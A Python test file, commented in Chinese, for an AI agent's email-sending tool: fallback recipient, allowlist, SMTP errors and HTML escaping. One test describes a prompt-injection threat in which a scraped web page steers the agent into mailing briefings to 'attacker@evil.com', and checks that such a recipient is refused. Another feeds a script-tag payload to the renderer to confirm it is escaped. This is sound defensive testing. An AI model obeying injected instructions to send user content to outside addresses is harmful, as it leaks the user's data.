"""
收件人兜底与邮件渲染。

回归背景：DEFAULT_RECIPIENT 曾经是「死配置」——.env 和 .env.example 里都写了，
但全项目没有一处读取它；收件人只来自 preferences.email，而这张表初始为空，
于是定时任务走到发信这一步必然失败。现在有三层兜底：
db.DEFAULT_PREFERENCES["email"] -> load_preferences() -> email_tools.send_email()。
"""

import os

import pytest

import db
import tools.email_tools as email_tools


class _FakeSMTP:
    """替换 smtplib.SMTP / SMTP_SSL，记录调用而不真的发信。"""

    instances = []

    def __init__(self, server=None, port=None, timeout=None):
        self.server = server
        self.port = port
        self.logged_in = False
        self.sent = []
        _FakeSMTP.instances.append(self)

    def __enter__(self):
        return self

    def __exit__(self, *exc_info):
        return False

    def starttls(self):
        return None

    def login(self, username, password):
        self.logged_in = True

    def sendmail(self, from_addr, to_addrs, message):
        self.sent.append({"from": from_addr, "to": list(to_addrs), "message": message})


@pytest.fixture
def configured(monkeypatch):
    """把 SMTP 配置和兜底收件人都换成测试值，避免依赖本机 .env。"""
    _FakeSMTP.instances.clear()
    monkeypatch.setattr(email_tools, "SMTP_SERVER", "smtp.test")
    monkeypatch.setattr(email_tools, "SMTP_PORT", 465)
    monkeypatch.setattr(email_tools, "SMTP_USERNAME", "bot@test")
    monkeypatch.setattr(email_tools, "SMTP_PASSWORD", "secret")
    monkeypatch.setattr(email_tools, "FROM_EMAIL", "bot@test")
    monkeypatch.setattr(email_tools, "DEFAULT_RECIPIENT", "fallback@test")
    monkeypatch.setattr(email_tools.smtplib, "SMTP_SSL", _FakeSMTP)
    monkeypatch.setattr(email_tools.smtplib, "SMTP", _FakeSMTP)
    return _FakeSMTP


def test_empty_recipient_falls_back_to_default(configured):
    result = email_tools.send_email("主题", "正文", "")

    assert "fallback@test" in result
    assert "兜底" in result
    assert configured.instances[-1].sent[-1]["to"] == ["fallback@test"]


def test_whitespace_recipient_also_falls_back(configured):
    result = email_tools.send_email("主题", "正文", "   ")

    assert "fallback@test" in result


def test_explicit_recipient_is_not_overridden(configured, monkeypatch):
    """偏好里保存过的邮箱可以直接作收件人，不会被动成 DEFAULT_RECIPIENT。"""
    monkeypatch.setattr(db, "load_preferences", lambda: {"email": "user@example.com"})

    result = email_tools.send_email("主题", "正文", "user@example.com")

    assert "user@example.com" in result
    assert "兜底" not in result
    assert configured.instances[-1].sent[-1]["to"] == ["user@example.com"]


def test_recipient_outside_allowlist_is_refused(configured, monkeypatch):
    """
    收件人白名单：模型不能把简报发到任意地址。

    收件人由模型给出、而新闻正文是不可信输入，没有这道限制时，
    抓到的网页里藏一段提示词就能诱导 Agent 把内容发到第三方邮箱。
    """
    monkeypatch.setattr(db, "load_preferences", lambda: {"email": "user@example.com"})
    _FakeSMTP.instances.clear()

    result = email_tools.send_email("主题", "正文", "attacker@evil.com")

    assert "失败" in result
    assert "attacker@evil.com" in result
    assert _FakeSMTP.instances == [], "白名单外的收件人不应尝试连接 SMTP"


def test_allowlist_degrades_to_default_when_db_unavailable(configured, monkeypatch):
    """读库失败时保守退化：只放开 DEFAULT_RECIPIENT，而不是放开白名单。"""

    def _boom():
        raise RuntimeError("database is down")

    monkeypatch.setattr(db, "load_preferences", _boom)

    assert email_tools.allowed_recipients() == {"fallback@test"}

    result = email_tools.send_email("主题", "正文", "user@example.com")
    assert "不在允许列表内" in result


def test_both_empty_returns_actionable_error_without_sending(monkeypatch):
    monkeypatch.setattr(email_tools, "SMTP_SERVER", "smtp.test")
    monkeypatch.setattr(email_tools, "SMTP_USERNAME", "bot@test")
    monkeypatch.setattr(email_tools, "SMTP_PASSWORD", "secret")
    monkeypatch.setattr(email_tools, "DEFAULT_RECIPIENT", "")
    monkeypatch.setattr(email_tools.smtplib, "SMTP_SSL", _FakeSMTP)
    _FakeSMTP.instances.clear()

    result = email_tools.send_email("主题", "正文", "")

    assert "失败" in result
    assert "DEFAULT_RECIPIENT" in result
    assert _FakeSMTP.instances == [], "没有收件人时不应尝试连接 SMTP"


def test_smtp_missing_reports_separately_from_recipient(monkeypatch):
    monkeypatch.setattr(email_tools, "SMTP_SERVER", "")
    monkeypatch.setattr(email_tools, "DEFAULT_RECIPIENT", "fallback@test")

    result = email_tools.send_email("主题", "正文", "")

    assert "SMTP" in result
    assert "收件人" not in result


def test_default_recipient_wiring_is_consistent():
    """.env 是唯一来源：db 层与邮件工具层读到的必须是同一个值。"""
    assert db.DEFAULT_RECIPIENT == os.getenv("DEFAULT_RECIPIENT", "").strip()
    assert db.DEFAULT_PREFERENCES["email"] == db.DEFAULT_RECIPIENT
    assert email_tools.DEFAULT_RECIPIENT == db.DEFAULT_RECIPIENT


def test_markdown_to_html_escapes_scripts():
    """简报正文里的 HTML 不能被邮件客户端当标签执行。"""
    html = email_tools._markdown_to_html("# 标题\n\n<script>alert(1)</script>\n\n- 项目一\n- 项目二")

    assert "<script>" not in html
    assert "&lt;script&gt;" in html
    assert "<ul>" in html and "</ul>" in html
